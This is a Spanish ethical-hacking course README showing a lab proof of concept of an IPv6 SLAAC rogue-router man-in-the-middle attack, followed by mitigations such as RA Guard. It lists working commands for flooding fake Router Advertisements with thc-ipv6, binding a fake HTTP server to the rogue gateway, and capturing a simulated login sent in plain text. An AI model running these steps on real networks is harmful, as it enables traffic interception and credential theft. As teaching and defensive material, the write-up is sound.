# PoC: Ataque SLAAC (IPv6 Rogue Router)

**Autor:** Pablo A.

**Asignatura:** Hacking Ético

**Fecha:** Diciembre 2025


---

## 1. Descripción del Proyecto.
Este proyecto demuestra una **Prueba de Concepto (PoC)** sobre la vulnerabilidad **SLAAC (Stateless Address Autoconfiguration)** en redes IPv6. 

El ataque consiste en introducir un **"Rogue Router"** (Router falso) en la red que envía paquetes *Router Advertisement* (RA) maliciosos. Esto provoca que los dispositivos víctimas se autoconfiguren automáticamente con una dirección IPv6 y una puerta de enlace controlada por el atacante, permitiendo un ataque **Man-in-the-Middle (MITM)** y la intercepción de tráfico.

<br/>

## 2. Entorno y Herramientas.

* **Máquina Atacante:** Kali Linux
    * `thc-ipv6` (Herramienta `atk6-fake_router6`)
    * `python3` (Módulo `http.server`)
    * `Wireshark`
* **Máquina Víctima:** Ubuntu 22.04
* **Red:** Configuración de red local (LAN) compartida.

<br/>

---

## 3. Procedimiento del Ataque.

### Paso 1: Preparación del Atacante.
Primero, instalamos las herramientas necesarias en Kali Linux y nos asignamos una IP estática dentro del rango malicioso que vamos a inyectar (`2001:1234::/64`) para actuar como gateway.

#### 1. Instalación de la suite thc-ipv6:
```bash
sudo apt update && sudo apt install thc-ipv6
```
<img width="425" height="140" alt="image" src="https://github.com/user-attachments/assets/b6aa5534-d34b-4c95-b37a-90a799602331" />

#### 2. Asignación manual de la IP del router falso:
```bash
sudo ip -6 addr add 2001:1234::1/64 dev eth0
```
<img width="425" height="210" alt="image" src="https://github.com/user-attachments/assets/7f3f9a1e-905e-476e-ad19-f294a3b45ac7" />

<br/>

### Paso 2: Despliegue del Rogue Router.
Lanzamos el ataque de inundación de paquetes RA. Esto hace que todos los equipos de la red acepten nuestro prefijo `2001:1234::` y nos configuren como su router IPv6 por defecto.

#### Comando para iniciar el anuncio de router falso:
```bash
sudo atk6-fake_router6 eth0 2001:1234::/64
```
<img width="425" height="72" alt="image" src="https://github.com/user-attachments/assets/edd7fe6f-c781-4731-a56f-eb78ca69cea7" />

<br/>

### Paso 3: Verificación en la Víctima (Infección).
En la máquina víctima (Ubuntu), comprobamos que el ataque ha tenido éxito. 

#### Revisión de la interfaz obtenida:
```bash
ip a
```
Al ejecutar `ip a`, observamos que la interfaz ha recibido automáticamente una dirección global del rango `2001:1234...` mediante SLAAC.

<img width="425" height="299" alt="image" src="https://github.com/user-attachments/assets/e7f64fe9-3bc5-42ba-8286-b822a8e1e150" />

<br/>

---

## 4. Captura de Credenciales (PoC).
Para demostrar el riesgo crítico de esta vulnerabilidad, levantamos un servidor web falso en el atacante y simulamos una conexión de la víctima.

### Paso 1: Servidor de escucha.
En el Atacante (Kali): Levantamos un servidor escuchando específicamente en la IP maliciosa:
```bash
sudo python3 -m http.server 80 --bind 2001:1234::1
```
<img width="425" height="97" alt="image" src="https://github.com/user-attachments/assets/d6ce1ad4-094c-4cd0-98e1-6c83faf89000" />

<br/>

### Paso 2: Wireshark.
En nuestra máquina Atacante (Kali) podemos también dejar Wireshark funcionando de fondo con un filtro http.
```bash
sudo wireshark -i eth0 -k -Y http
```

### Paso 3: Simulación de envío de credenciales.
En la Víctima (Ubuntu): Simulamos el envío de credenciales mediante una petición HTTP:
```bash
wget "[http://[2001:1234::1]/login?usuario=admin&pass=capturado](http://[2001:1234::1]/login?usuario=admin&pass=capturado)"
```
o
```bash
firefox "http://[2001:1234::1]/login?usuario=admin&pass=capturado"
```
<img width="425" height="227" alt="image" src="https://github.com/user-attachments/assets/266653f6-6018-4e6e-8638-9e922c646fb9" />

<br/>

### Resultado Exitoso.
Como se observa en la siguiente captura, el servidor del atacante intercepta la petición completa, revelando el usuario y la contraseña en texto plano en los logs:

<img width="425" height="72" alt="image" src="https://github.com/user-attachments/assets/60f1dcd7-e308-4275-965b-f7f7e4157489" />

<br/>

Adicionalmente, Wireshark confirma la captura del paquete HTTP GET con los datos sensibles:

<img width="425" height="213" alt="image" src="https://github.com/user-attachments/assets/1a139250-41eb-4351-a33d-90f57876f56c" />

<br/>

---

## 5. Mitigación y Soluciones.
Para protegerse contra ataques de Rogue Router IPv6 (SLAAC):

### 1. RA Guard (Router Advertisement Guard): 
Configurar los switches de red para bloquear paquetes RA (ICMPv6 Tipo 134) que provengan de puertos no autorizados (puertos de acceso de usuarios).

### 2. Desactivar IPv6: 
Si la infraestructura de red no requiere IPv6, se recomienda deshabilitarlo en los clientes y servidores para reducir la superficie de ataque.

### 3. Filtrado ACL / Port Security: 
Implementar listas de control de acceso para limitar qué dispositivos pueden actuar como gateways.

### 4. Uso de VPN y HTTPS: 
Cifrar el tráfico evita que, aunque el enrutamiento sea comprometido, las credenciales sean legibles en texto plano.

<br/>

---
Este proyecto ha sido realizado con fines educativos en un entorno controlado.
